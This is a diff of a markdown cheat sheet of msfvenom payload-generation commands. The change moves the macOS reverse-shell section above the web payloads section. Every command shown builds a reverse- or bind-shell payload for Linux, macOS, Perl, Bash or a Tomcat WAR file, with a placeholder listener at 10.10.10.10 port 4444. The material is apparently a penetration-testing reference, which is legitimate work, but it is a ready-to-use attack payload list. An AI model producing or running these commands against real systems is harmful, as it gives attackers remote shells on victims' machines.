@@ -75,6 +75,12 @@ Below are some different payload commands. I have grouped them with a heading to
 | Linux x64 Reverse TCP | `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf > shell_x86.elf` |
 | Linux Bind TCP | `msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=4444 -f elf > bind_shell.elf` |
 
+### OSX / macOS Payloads
+
+| Description | Command |
+| --- | --- |
+| macOS Reverse TCP | `msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f macho > shell.macho` |
+
 ### Web Payloads
 
 | Description | Command |
@@ -86,10 +92,3 @@ Below are some different payload commands. I have grouped them with a heading to
 | Perl Reverse TCP | `msfvenom -p cmd/unix/reverse_perl LHOST=10.10.10.10 LPORT=4444 -f raw > shell.pl` |
 | WAR File (Tomcat deployment) | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f war > shell.war` |
 | Bash Reverse TCP | `msfvenom -p cmd/unix/reverse_bash LHOST=10.10.10.10 LPORT=4444 -f raw > shell.sh` |
-
-### OSX / macOS Payloads
-
-| Description | Command |
-| --- | --- |
-| macOS Reverse TCP | `msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f macho > shell.macho` |
-
